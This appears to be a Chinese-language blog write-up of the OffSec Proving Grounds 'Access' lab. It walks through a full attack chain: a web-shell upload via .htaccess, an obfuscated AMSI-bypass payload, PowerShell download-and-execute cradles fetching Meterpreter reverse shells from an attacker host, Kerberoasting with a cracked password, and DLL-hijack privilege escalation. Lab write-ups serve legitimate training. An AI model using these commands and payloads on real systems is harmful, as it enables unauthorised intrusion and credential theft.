@@ -1,0 +1,120 @@
+<hr>
+<h2 id="title-Proving-Grounds-Access-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds"><a href="#title-Proving-Grounds-Access-Writeupdate-2024-7-26categories-LabWriteuptags-Proving-Grounds" class="headerlink" title="title: Proving Grounds Access Writeupdate: 2024-7-26categories: LabWriteuptags: Proving Grounds"></a>title: Proving Grounds Access Writeup<br>date: 2024-7-26<br>categories: LabWriteup<br>tags: Proving Grounds</h2><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><p>对端口进行扫描探测：</p>
+<pre><code class="BASH">nmap 192.168.203.187 -p- -Pn -n -sT --min-rate 2000
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702180120139.png" alt="image-20240702180120139"></p>
+<pre><code class="bash">nmap 192.168.203.187 -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268 -Pn
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702180330271.png" alt="image-20240702180330271"></p>
+<p>根据扫描结果来看，目标域名为access.offsec。</p>
+<h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag:"></a>GetFlag:</h4><p>搜集目录信息，发现有趣的URL：</p>
+<pre><code class="bash">dirsearch -u http://access.offsec/
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702181156268.png" alt="image-20240702181156268"></p>
+<pre><code class="HTTP">http://access.offsec/cgi-bin/printenv.pl
+http://access.offsec/uploads/
+http://access.offsec/assets/
+http://access.offsec/forms/
+</code></pre>
+<p>获取到站点绝对路径：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702181303375.png" alt="image-20240702181303375"></p>
+<p>点击网页的Buy Ticket，会发现一个文件上传接口：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702181627466.png" alt="image-20240702181627466"></p>
+<p>上传一个正常图片后，在URL地址中能够发现上传的图片：</p>
+<pre><code class="HTTP">http://access.offsec/uploads/
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702181727369.png" alt="image-20240702181727369"></p>
+<p>尝试上传PHP文件发现会被过滤：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702181954375.png" alt="image-20240702181954375"></p>
+<p>上传 .htaccess文件：</p>
+<pre><code class="bash">echo &quot;AddType application/x-httpd-php .thtml&quot; &gt; .htaccess
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702183201941.png" alt="image-20240702183201941"></p>
+<p>上传thtml后门文件，查看进程列表，发现有Defener：</p>
+<pre><code class="HTTP">http://access.offsec/uploads/user.thtml?cmd=tasklist%20/svc
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702183514371.png" alt="image-20240702183514371"></p>
+<p>查看当前用户权限：</p>
+<pre><code class="HTTP">http://access.offsec/uploads/user.thtml?cmd=whoami%20/all
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702183606016.png" alt="image-20240702183606016"></p>
+<p>当前用户不会受UAC影响，查看系统信息：</p>
+<pre><code class="HTTP">http://access.offsec/uploads/user.thtml?cmd=systeminfo
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702184044506.png" alt="image-20240702184044506"></p>
+<p>查看Powershell执行策略：</p>
+<pre><code class="http">http://access.offsec/uploads/user.thtml?cmd=powershell%20-c%20Get-ExecutionPolicy
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702190440963.png" alt="image-20240702190440963"></p>
+<p>制作Bypass AMSI payload：</p>
+<pre><code class="powershell">S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; +  &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;)  + (&#39;uZ&#39;+&#39;x&#39;)  ) ( [TYpE](  &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39;  ) )  ;    (    Get-varI`A`BLE  ( (&#39;1Q&#39;+&#39;2U&#39;)  +&#39;zX&#39;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f(&#39;a&#39;+&#39;msi&#39;),&#39;d&#39;,(&#39;I&#39;+&#39;nitF&#39;+&#39;aile&#39;)  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f (&#39;S&#39;+&#39;tat&#39;),&#39;i&#39;,(&#39;Non&#39;+&#39;Publ&#39;+&#39;i&#39;),&#39;c&#39;,&#39;c,&#39;  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
+</code></pre>
+<p>生成Meterpreter载荷：</p>
+<pre><code class="bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.238 LPORT=443 -f psh-reflection &gt; reverse_meterpreter.ps1
+</code></pre>
+<p>进行载荷投递：</p>
+<pre><code class="powershell">powershell -c &quot;IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.238/amsi.txt&#39;));IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.238/reverse_meterpreter.ps1&#39;));&quot;
+</code></pre>
+<p>访问地址：</p>
+<pre><code class="http">http://access.offsec/uploads/user.thtml?cmd=powershell%20-c%20%22IEX%20((New-Object%20Net.Webclient).Downloadstring(%27http%3A%2F%2F192.168.45.238%2Famsi.txt%27))%3BIEX%20((New-Object%20Net.Webclient).Downloadstring(%27http%3A%2F%2F192.168.45.238%2Freverse_meterpreter.ps1%27))%3B%22
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702192005067.png" alt="image-20240702192005067"></p>
+<p>启动一个新notepad进程用来迁移，防止http服务崩溃：</p>
+<pre><code>meterpreter &gt; execute -f &quot;notepad.exe&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702192227591.png" alt="image-20240702192227591"></p>
+<pre><code>meterpreter &gt; migrate 3436
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702192244057.png" alt="image-20240702192244057"></p>
+<p>Bypass AMSI并加载使用sharphound.ps1:</p>
+<pre><code>IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.238/SharpHound.ps1&#39;))
+</code></pre>
+<pre><code>Invoke-Bloodhound -CollectionMethod All -ZipFileName loot.zip
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702193146853.png" alt="image-20240702193146853"></p>
+<p>将Sharphound生成的zip上传到bloodhound中，根据返回的数据v显示，<a href="mailto:&#83;&#86;&#67;&#95;&#x41;&#80;&#65;&#x43;&#x48;&#69;&#64;&#65;&#67;&#x43;&#x45;&#83;&#x53;&#46;&#x4f;&#70;&#70;&#x53;&#69;&#67;">&#83;&#86;&#67;&#95;&#x41;&#80;&#65;&#x43;&#x48;&#69;&#64;&#65;&#67;&#x43;&#x45;&#83;&#x53;&#46;&#x4f;&#70;&#70;&#x53;&#69;&#67;</a>用户具有SPN，当前windows内存中有svc_apache用户的凭证:</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702195412557.png" alt="image-20240702195412557"></p>
+<p>加载如下脚本：</p>
+<pre><code class="http">wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+</code></pre>
+<pre><code>iex(new-object net.webclient).downloadString(&#39;http://192.168.45.238:80/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat Hashcat
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240702201122901.png" alt="image-20240702201122901"></p>
+<p>hashcat破解：</p>
+<pre><code>hashcat -m 13100 mssqlhash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<pre><code>svc_mssql:trustno1
+</code></pre>
+<p>使用Invoke-RunasCs模拟用户身份：</p>
+<pre><code>wget https://raw.githubusercontent.com/antonioCoco/RunasCs/master/Invoke-RunasCs.ps1
+</code></pre>
+<pre><code>iex(new-object net.webclient).downloadString(&#39;http://192.168.45.238:80/Invoke-RunasCs.ps1&#39;);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703002007479.png" alt="image-20240703002007479"></p>
+<p>该用户具有SeManageVolumePrivilege权限：</p>
+<pre><code>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &quot;whoami /all&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703002216256.png" alt="image-20240703002216256"></p>
+<p>获取该用户的会话：</p>
+<pre><code>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &quot;powershell -c IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.238/amsi.txt&#39;));IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.238/reverse_meterpreter.ps1&#39;));&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703003533583.png" alt="image-20240703003533583"></p>
+<p>在github上可以找到一个项目：</p>
+<pre><code class="http">https://github.com/CsEnox/SeManageVolumeExploit
+</code></pre>
+<p>根据利用说明，需先生成一个dll，并将其放到指定位置：</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.238 LPORT=443 -f dll -o test.dll
+</code></pre>
+<p>并通过Meterpreter将其上传到目标机器中：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703003057894.png" alt="image-20240703003057894"></p>
+<p>判断svc_mssql对目录的写入权限：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703003912004.png" alt="image-20240703003912004"></p>
+<p>tzres.dll主要作用是包含与时区（Time Zone）相关的资源和信息。它是操作系统用于处理时区设置和时区转换的重要组件之一，我将其替换成我的evil.dll:</p>
+<pre><code>copy test.dll C:\Windows\System32\wbem\tzres.dll
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703004306963.png" alt="image-20240703004306963"></p>
+<p>输入systeminfo去打印系统时区，从而触发payload：</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703004457374.png" alt="image-20240703004457374"></p>
+<p>获取flag:</p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703004550829.png" alt="image-20240703004550829"></p>
+<p><img src="https://raw.githubusercontent.com/Anneballa/Anneballa.github.io/main/image/image-20240703004644141.png" alt="image-20240703004644141"></p>
